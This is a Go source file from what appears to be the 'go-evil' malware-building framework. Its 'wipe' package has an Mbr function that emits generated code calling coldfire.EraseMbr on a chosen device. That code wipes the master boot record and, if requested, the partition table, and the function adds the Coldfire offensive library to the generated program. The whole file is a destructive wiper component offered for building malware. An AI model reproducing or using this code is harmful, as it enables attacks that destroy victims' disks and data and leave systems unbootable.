package wipe

import (
	"fmt"

	"github.com/s9rA16Bf4/go-evil/utility/structure"
	"github.com/s9rA16Bf4/go-evil/utility/structure/functions"
	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
	"github.com/s9rA16Bf4/go-evil/utility/tools"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

// Tries to wipe the mbr
// Input is an evil array with the following format, ${"device", "erase partition table? (true/false)"}$
func Mbr(value string, data_object *json.Json_t) []string {
	function_call := "wipe_mbr"
	arr := structure.Create_evil_object(value)

	if arr.Length() != 2 {
		notify.Error(fmt.Sprintf("Obtained evil array had size %d, but 2 was requested", arr.Length()), "system.move()")
	}

	device := arr.Get(0)
	wipe_partition_table := tools.String_to_boolean(arr.Get(1))

	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
		Parameters: []string{"repr_1 []int", "repr_2 bool"},

		Gut: []string{
			"value1 := spine.variable.get(spine.alpha.construct_string(repr_1))",
			"err := coldfire.EraseMbr(value1, repr_2)",
			"if err != nil{",
			"spine.log(err.Error())",
			"}",
		}})

	data_object.Add_go_import("github.com/redcode-labs/Coldfire")

	parameter_1 := data_object.Generate_int_array_parameter(device)

	return []string{fmt.Sprintf("%s(%s, %t)", function_call, parameter_1, wipe_partition_table)}
}
